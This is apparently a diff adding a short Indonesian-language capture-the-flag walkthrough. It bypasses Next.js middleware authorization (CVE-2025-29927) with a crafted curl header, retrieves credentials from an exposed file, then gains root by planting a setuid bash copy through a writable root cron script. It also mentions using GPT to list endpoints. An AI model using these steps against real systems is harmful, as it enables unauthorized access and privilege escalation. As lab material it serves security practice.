@@ -1,0 +1,30 @@
+[38;5;238m───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+       [38;5;238m│ [0mFile: [1mnote.txt[0m
+[38;5;238m───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[38;5;238m   1[0m   [38;5;238m│[0m [38;2;248;248;242m- user.txt :[0m
+[38;5;238m   2[0m   [38;5;238m│[0m [38;2;248;248;242m> nmap service 3000 dia pake next masih development, fuzz gada yg menarik udah ku masukin 1 1 soalnya[0m
+[38;5;238m   3[0m   [38;5;238m│[0m [38;2;248;248;242m> cek source code, ada .js banyak tuh copas aja suruh gpt ngelist endpoint2 source src .js nya semua[0m
+[38;5;238m   4[0m   [38;5;238m│[0m [38;2;248;248;242m> cek yg penting2 suruh gpt list mana yg penting2, masukin aja 1 1, ada tuh yang .error juga ato yg src index.js[0m
+[38;5;238m   5[0m   [38;5;238m│[0m [38;2;248;248;242m> cek2 aja semua ama gpt dulu terus analyze aja code nya[0m
+[38;5;238m   6[0m   [38;5;238m│[0m [38;2;248;248;242m> jadi karna ini nextjs, buat nya juga abis ada CVE di nextjs yg authorization bypass[0m
+[38;5;238m   7[0m   [38;5;238m│[0m [38;2;248;248;242m> https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware[0m
+[38;5;238m   8[0m   [38;5;238m│[0m [38;2;248;248;242m> https://github.com/kOaDT/poc-cve-2025-29927/tree/main[0m
+[38;5;238m   9[0m   [38;5;238m│[0m [38;2;248;248;242m> nah disitu tinggal curl aja ke yg beda, ke /.git kan 404, ke /whatever ada 500[0m
+[38;5;238m  10[0m   [38;5;238m│[0m [38;2;248;248;242m> curl aja tuh kasih headernya sesuai vuln cve nya[0m
+[38;5;238m  11[0m   [38;5;238m│[0m [38;2;248;248;242m> curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" ip:3000/whatever, ada nan[0m
+[38;5;238m    [0m   [38;5;238m│[0m [38;2;248;248;242mti[0m
+[38;5;238m  12[0m   [38;5;238m│[0m [38;2;248;248;242m> gatau kenapa kalau di browser tuh gabisa di buka, udah pasang header di burp padahal tapi masih gabisa di buka[0m
+[38;5;238m  13[0m   [38;5;238m│[0m [38;2;248;248;242m> cuman bisa lewat curl -H, nah intinya nanti ada path /files/README.md, wget aja, disana ada creds[0m
+[38;5;238m  14[0m   [38;5;238m│[0m [38;2;248;248;242m> ssh -> klaim flag[0m
+[38;5;238m  15[0m   [38;5;238m│[0m 
+[38;5;238m  16[0m   [38;5;238m│[0m 
+[38;5;238m  17[0m   [38;5;238m│[0m [38;2;248;248;242m- root :[0m
+[38;5;238m  18[0m   [38;5;238m│[0m [38;2;248;248;242m> pake linpeas wget ke vm mu kalo gabisa pake scp aja, ada vuln di path /dev/shm, gatau apa tapi binary yg di exec am[0m
+[38;5;238m    [0m   [38;5;238m│[0m [38;2;248;248;242ma root, gada [0m
+[38;5;238m  19[0m   [38;5;238m│[0m [38;2;248;248;242m> coba cek crontab, cat /etc/crontab, ada cleanup tuh yg run root[0m
+[38;5;238m  20[0m   [38;5;238m│[0m [38;2;248;248;242m> ke path yg vuln, bikin file cleanup disitu[0m
+[38;5;238m  21[0m   [38;5;238m│[0m [38;2;248;248;242m> #!/bin/bash, terus bikin aja -> cp /bin/bash /tmp/xixixi -> chmod +s /tmp/xixixi -> dah[0m
+[38;5;238m  22[0m   [38;5;238m│[0m [38;2;248;248;242m> nah chmod +x in itu scriptnya, terus tunggu aja di /tmp[0m
+[38;5;238m  23[0m   [38;5;238m│[0m [38;2;248;248;242m> terus run aja nanti , /tmp/xixixi -p[0m
+[38;5;238m  24[0m   [38;5;238m│[0m [38;2;248;248;242m> klaim root  [0m
+[38;5;238m───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
